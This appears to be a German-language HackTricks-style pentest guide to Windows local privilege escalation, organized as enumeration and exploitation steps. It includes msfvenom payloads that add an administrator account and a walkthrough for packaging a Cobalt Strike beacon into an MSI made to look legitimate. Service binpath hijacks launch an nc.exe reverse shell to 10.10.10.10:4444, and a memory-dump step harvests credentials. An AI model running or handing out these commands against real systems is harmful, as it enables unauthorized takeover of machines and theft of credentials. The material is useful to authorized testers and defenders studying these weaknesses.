# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation-Vektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Einleitung: Windows-Theorie

### Access Tokens

**Wenn Sie nicht wissen, was Windows Access Tokens sind, lesen Sie die folgende Seite, bevor Sie fortfahren:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Lesen Sie die folgende Seite für mehr Informationen über ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn Sie nicht wissen, was Integrity Levels in Windows sind, sollten Sie die folgende Seite lesen, bevor Sie fortfahren:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Mechanismen in Windows, die Sie daran hindern können, das System zu **enumerieren**, ausführbare Dateien auszuführen oder sogar Ihre Aktivitäten zu **erkennen**. Sie sollten die folgende **Seite** lesen und all diese **Abwehrmechanismen** **enumerieren**, bevor Sie mit der Privilege Escalation-Enumeration beginnen:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Prüfen Sie, ob die Windows-Version bekannte Schwachstellen hat (prüfen Sie auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

[this site](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu recherchieren. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive attack surface**, die eine Windows-Umgebung darstellt.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche Credentials/Juicy info in den env variables gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Wie Sie dies aktivieren, erfahren Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details der PowerShell-Pipeline-Ausführungen werden aufgezeichnet und umfassen ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wähle **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Events aus den PowersShell logs anzuzeigen, können Sie folgendes ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ein vollständiger Aktivitäts- und Inhaltsnachweis der Skriptausführung wird erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Audit-Trail jeder Aktivität, der für forensics und die Analyse bösartiger Aktivitäten wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess geliefert.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Ereignisse für das Script Block finden Sie in der Windows-Ereignisanzeige unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sie können das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Sie beginnen damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes in der cmd ausführen:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn Sie eine Antwort wie eine der folgenden erhalten:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann ist es **ausnutzbar.** Wenn der zuletzt genannte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstelle auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) verwenden — dies sind MiTM-weaponized Exploit-Skripte, um 'fake' Updates in non-SSL WSUS-Traffic einzuschleusen.

Lesen Sie die Recherche hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lesen Sie den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Wesentlichen ist dies die Schwachstelle, die dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern, und Windows Updates den in den Internet Explorer-Einstellungen konfigurierten Proxy verwendet, dann haben wir die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als erhöhter Benutzer auf unserem Asset auszuführen.
>
> Außerdem, da der WSUS-Dienst die Einstellungen des aktuellen Benutzers verwendet, wird er auch dessen Zertifikatsspeicher verwenden. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname erzeugen und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine trust-on-first-use Art der Validierung für das Zertifikat umzusetzen. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es verfügbar ist).

## Third-Party Auto-Updaters und Agent IPC (local privesc)

Viele Enterprise-Agents öffnen eine localhost IPC-Oberfläche und einen privilegierten Update-Kanal. Wenn die Enrollment auf einen Angreifer-Server umgelenkt werden kann und der Updater einer rogue root CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI liefern, das der SYSTEM-Dienst installiert. Siehe eine generalisierte Technik (basierend auf der Netskope stAgentSvc chain – CVE-2025-0309) hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

In Windows **domain**-Umgebungen existiert eine **local privilege escalation**-Schwachstelle unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP signing** nicht erzwungen wird, Benutzer Self-Rights besitzen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Fähigkeit, Computer innerhalb der Domain zu erstellen. Es ist wichtig zu beachten, dass diese **Voraussetzungen** mit **Standardeinstellungen** erfüllt sind.

Den **Exploit** finden Sie in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für mehr Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungseinträge **aktiviert** sind (Wert ist **0x1**), dann können Benutzer beliebiger Berechtigungsstufen `*.msi` Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` aus power-up, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zur Eskalation von Privilegien zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/einer Gruppe auffordert (Sie benötigen also GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach das erstellte Binary aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie man einen MSI Wrapper mit diesen Tools erstellt. Beachte, dass du eine "**.bat**" Datei einpacken kannst, wenn du **nur** **Befehlszeilen** **ausführen** möchtest.

{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Gib dem Projekt einen Namen, wie **AlwaysPrivesc**, verwende **`C:\privesc`** für den Speicherort, wähle **place solution and project in the same directory** und klicke auf **Create**.
- Klicke weiter auf **Next**, bis du zu Schritt 3 von 4 kommst (choose files to include). Klicke **Add** und wähle das Beacon-Payload, das du gerade generiert hast. Dann klicke auf **Finish**.
- Markiere das **AlwaysPrivesc** Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Properties, die du ändern kannst, wie z. B. **Author** und **Manufacturer**, wodurch die installierte App legitimer erscheinen kann.
- Rechtsklicke das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine **beacon.exe** Datei und klicke auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Unter den **Custom Action Properties** ändere **Run64Bit** auf **True**.
- Schließlich **build it**.
- Falls die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 setzt.

### MSI Installation

Um die **Installation** der bösartigen `.msi` Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen bestimmen, was **logged** wird, daher sollten Sie darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — es ist interessant zu wissen, wohin die logs gesendet werden
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung lokaler Administrator-Passwörter** ausgelegt und stellt sicher, dass jedes Passwort auf Computern, die einer Domain angehören, **einzigartig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen durch ACLs ausreichende Berechtigungen gewährt wurden, sodass sie lokale Admin-Passwörter einsehen können, wenn sie autorisiert sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Seit **Windows 8.1** hat Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) eingeführt, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code zu injizieren und so das System weiter abzusichern.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie pass-the-hash-Angriffen zu schützen.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldeinformationen

**Domänen-Anmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Komponenten des Betriebssystems genutzt. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden typischerweise Domänen-Anmeldeinformationen für den Benutzer erstellt.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Prüfe, ob eine der Gruppen, zu denen du gehörst, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie man sie missbrauchen kann, um Privilegien zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahre mehr** darüber, was ein **token** ist auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante tokens zu erfahren** und wie man diese missbraucht:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwort-Richtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Wenn du Prozesse auflistest, **prüfe auf Passwörter in der Befehlszeile des Prozesses**.\
Prüfe, ob du **ein laufendes Binary überschreiben kannst** oder ob du Schreibrechte im Ordner des Binaries hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Prüfe immer, ob mögliche [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Berechtigungen der Binärdateien von Prozessen prüfen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst einen memory dump eines laufenden Prozesses mit **procdump** von sysinternals erstellen. Dienste wie FTP haben oft die **credentials in clear text in memory** — versuche, den Speicher zu dumpen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer erlauben, ein CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suche nach "command prompt", klicke auf "Click to open Command Prompt"

## Dienste

Service Triggers ermöglichen es Windows, einen Service zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selbst ohne SERVICE_START-Rechte kann man häufig privilegierte Dienste starten, indem man deren Triggers auslöst. See enumeration and activation techniques here:

-
{{#ref}}
service-triggers.md
{{#endref}}

Liste der Dienste abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen zu einem Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ bereitzuhalten, um die erforderliche Berechtigungsstufe für jeden Dienst zu prüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler haben (z. B. bei SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Sie können den Dienst wie folgt aktivieren
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachte, dass der Dienst upnphost von SSDPSRV abhängig ist, um zu funktionieren (für XP SP1)**

**Eine weitere Umgehungslösung** dieses Problems ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Service-Binärpfad ändern**

Wenn die Gruppe "Authenticated users" für einen Service **SERVICE_ALL_ACCESS** besitzt, ist es möglich, die ausführbare Binary des Service zu ändern. Um **sc** zu modifizieren und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können über verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der vom Service ausgeführten Binärdatei.
- **WRITE_DAC**: Ermöglicht das Ändern von Berechtigungen, wodurch Service-Konfigurationen geändert werden können.
- **WRITE_OWNER**: Erlaubt Eigentumsübernahme und das Neusetzen von Berechtigungen.
- **GENERIC_WRITE**: Vererbt die Möglichkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Vererbt ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen von Service-Binärdateien

**Prüfe, ob du die vom Service ausgeführte Binärdatei ändern kannst** oder ob du **Schreibrechte auf den Ordner** hast, in dem die Binärdatei liegt ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst alle Binärdateien, die von einem Service ausgeführt werden, mit **wmic** (nicht in system32) ermitteln und deine Berechtigungen mit **icacls** prüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Berechtigungen zum Ändern der Service-Registry

Du solltest prüfen, ob du irgendeine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** für eine Service-**Registry** prüfen, indem du:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die vom Service ausgeführte Binary verändert werden.

Um den Pfad der ausgeführten Binary zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory Berechtigungen

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass **Sie aus diesem Schlüssel Unterschlüssel erstellen können**. Im Fall von Windows-Services ist das **ausreichend, um beliebigen Code auszuführen:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Service-Pfade ohne Anführungszeichen

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jedes Segment vor einem Leerzeichen auszuführen.

Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, Folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Du kannst diese Schwachstelle mit metasploit erkennen und ausnutzen**: `exploit/windows/local/trusted\_service\_path` Du kannst manuell eine Service-Binärdatei mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows erlaubt es Benutzern, Aktionen anzugeben, die ausgeführt werden sollen, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine binary zeigt. Wenn diese binary ersetzbar ist, könnte privilege escalation möglich sein. Weitere Details finden sich in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Überprüfe die **Berechtigungen der binaries** (vielleicht kannst du eine überschreiben und privilege escalation durchführen) und die **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei so verändern kannst, dass du eine spezielle Datei lesen kannst, oder ob du eine Binärdatei ändern kannst, die von einem Administrator-Konto (schedtasks) ausgeführt wird.

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
